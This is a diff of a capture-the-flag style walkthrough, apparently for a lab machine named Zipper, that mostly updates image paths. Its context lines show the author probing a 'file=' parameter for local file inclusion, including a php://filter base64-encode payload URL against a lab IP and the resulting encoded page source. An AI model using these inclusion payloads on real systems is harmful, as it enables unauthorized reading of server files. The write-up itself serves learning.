@@ -6,11 +6,11 @@ description: Community Rating:Very hard
 
 So we start off with a scan:
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is the webpage:
 
-<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 what i'm interested in is the possible LFI withe file=home parameter so i try reading important stuff ->
 
@@ -38,7 +38,7 @@ output on the screen:
 cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgdmFsdWU9IlVwbG9hZCI+CgkJCQkJCTwvZGl2PgoJCQkJCQk8ZGl2IGNsYXNzPSJjdXN0b20tZmlsZSI+CgkJCQkJCSAgICA8aW5wdXQgdHlwZT0iZmlsZSIgY2xhc3M9ImN1c3RvbS1maWxlLWlucHV0IiBuYW1lPSJpbWdbXSIgbXVsdGlwbGU+CgkJCQkJCSAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1maWxlLWxhYmVsIiA+Q2hvb3NlIEZpbGU8L2xhYmVsPgoJCQkJCQk8L2Rpdj4KCQkJCQk8L2Rpdj4KCQkJCTwvZm9ybT4KCQkJCQogICAgCQk8L2Rpdj4KCQk8L2Rpdj4KICA8L2Rpdj4KCgo8L2Rpdj4KCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgPGZvb3Rlcj4KICAgIDxwPiZjb3B5OyBaaXBwZXIgMjAyMTwvcD4KICA8L2Zvb3Rlcj4KPC9kaXY+IDwhLS0gLy5jb250YWluZXIgLS0+CjwhLS0gcGFydGlhbCAtLT4KICA8c2NyaXB0IHNyYz0naHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTMuMC91bWQvcG9wcGVyLm1pbi5qcyc+PC9zY3JpcHQ+CjxzY3JpcHQgc3JjPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90d2l0dGVyLWJvb3RzdHJhcC80LjAuMC1iZXRhLjIvanMvYm9vdHN0cmFwLmJ1bmRsZS5taW4uanMnPjwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So the funny thing os a did not even specify a php file and it still outputed something so that must mean the backend appends .php to my filename home -> home.php / index -> index.php etc
 
@@ -48,7 +48,7 @@ view-source:http://192.168.56.229/index.php?file=php://filter/convert.base64-enc
 
 lol ok that was it:
 
-<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I tried uploadingg something just for fun earlier and saw this:
 
